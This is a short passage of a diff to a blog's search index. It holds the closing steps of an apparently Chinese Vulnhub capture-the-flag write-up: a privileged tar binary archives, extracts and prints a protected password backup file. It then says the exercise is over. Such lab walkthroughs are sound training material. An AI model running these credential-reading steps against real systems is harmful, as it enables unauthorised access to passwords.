-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./tar -cf 1.tar /var/backups/.old_pass.bak</span><br><span class="line">tar xf 1.tar</span><br><span class="line">cd var/backups/</span><br><span class="line">cat .old_pass.bak</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061743184.jpg" alt="enum4linux"></p>
-<p>打靶结束！！！</p>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub-Easy</tag>
       </tags>
   </entry>
 </search>
